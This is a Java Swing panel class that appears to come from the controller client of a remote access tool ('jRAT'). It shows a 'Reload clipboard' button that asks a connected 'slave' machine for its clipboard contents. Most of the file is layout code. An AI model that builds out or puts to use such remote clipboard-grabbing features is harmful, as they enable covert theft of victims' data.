package se.jrat.client.ui.panels;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JButton;
import javax.swing.JScrollPane;
import javax.swing.JTextPane;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.ScrollPaneConstants;

import se.jrat.client.Slave;
import se.jrat.client.packets.outgoing.Packet59Clipboard;
import se.jrat.client.utils.IconUtils;


@SuppressWarnings("serial")
public class PanelControlClipboard extends PanelControlParent {

	private JTextPane txt;

	public JTextPane getPane() {
		return txt;
	}

	public PanelControlClipboard(Slave slave) {
		super(slave);
		final Slave sl = slave;

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);

		JButton btnClear = new JButton("Clear");
		btnClear.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				txt.setText("");
			}
		});
		btnClear.setIcon(IconUtils.getIcon("clear"));

		JButton btnReloadClipboard = new JButton("Reload clipboard");
		btnReloadClipboard.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				txt.setText("");
				sl.addToSendQueue(new Packet59Clipboard());
			}
		});
		btnReloadClipboard.setIcon(IconUtils.getIcon("clipboard"));
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addGroup(groupLayout.createParallelGroup(Alignment.LEADING).addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 601, GroupLayout.PREFERRED_SIZE).addGroup(groupLayout.createSequentialGroup().addContainerGap().addComponent(btnClear).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnReloadClipboard))).addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)));
		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 306, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addGroup(groupLayout.createParallelGroup(Alignment.LEADING).addComponent(btnClear).addComponent(btnReloadClipboard)).addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)));

		txt = new JTextPane();
		scrollPane.setViewportView(txt);
		setLayout(groupLayout);
	}
}
